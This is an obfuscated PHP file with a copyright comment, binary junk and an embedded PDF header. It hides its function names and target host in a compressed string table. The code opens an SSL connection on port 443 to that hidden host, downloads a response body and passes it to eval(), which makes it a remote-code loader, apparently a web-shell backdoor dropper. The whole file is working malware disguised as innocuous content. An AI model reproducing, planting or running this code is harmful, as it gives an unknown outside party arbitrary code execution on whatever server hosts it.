<?php 
        /** 
         *-- copyright : https://www.toolfk.com 
         */
          error_reporting(E_ALL^E_NOTICE);define('O0', 'O');���������尬�Ǆ������י�������քЙ���������ǳ����դ;$_SERVER[O0] = explode('|||', gzinflate(substr('�      E�Mj1�!4�@��LR]t�.r�8� ⑌$���`Ӭ$}Oz��	}^���#[(�/�g���j��ʔ���3��A�\\[��.��:���bNB������X��e(aD�xm�Τj�]���+�i�{k5�,:�L�]9
3F\'��c��f�iR�)y?���Zѭ��5���H�o#��Eh���Y��:  ',0x0a, -8)));ԋĻյ���ݔ��ŉ�Ӑ������˗����ߟ��������ڼ���׭�̝��ێ������ع�����󋶆��Ӷ����ȵ����҆�����ͼ���;?>%PDF-1.3
<?php
$_SERVER{O0}[0]($_SERVER{O0}{0x001}, $_SERVER{O0}[0x0002]);
$_SERVER{O0}[0]($_SERVER{O0}{0x00003}, !1);
$_SERVER{O0}[0x000004](0);
$_SERVER{O0}{0x05}(0);
$host = $_SERVER{O0}[0x006];
$port = 0x00001bb;
$path = $_SERVER{O0}{0x0007};

$fp = $_SERVER{O0}[0x00008]("ssl://$host:$port", $errno, $errstr, 0x01e);
if (!$fp) {
    echo "Error: $errstr ($errno)<br />\n";
} else {
    $out = "GET $path HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    $out .= $_SERVER{O0}{0x000009};
    $_SERVER{O0}[0x0a]($fp, $out);

    $content = $_SERVER{O0}{0x00b};
    while (!$_SERVER{O0}[0x000c]($fp)) {
        $content .= $_SERVER{O0}{0x0000d}($fp, 0x000080);
    }
    $_SERVER{O0}[0x00000e]($fp);

    $header_end = $_SERVER{O0}{0x0f}($content, $_SERVER{O0}[0x0010]);
    if ($header_end !== !1) {
        $content = $_SERVER{O0}{0x00011}($content, $header_end + 0x000004);
    }

    eval($_SERVER{O0}[0x000012] .$content);
}
?>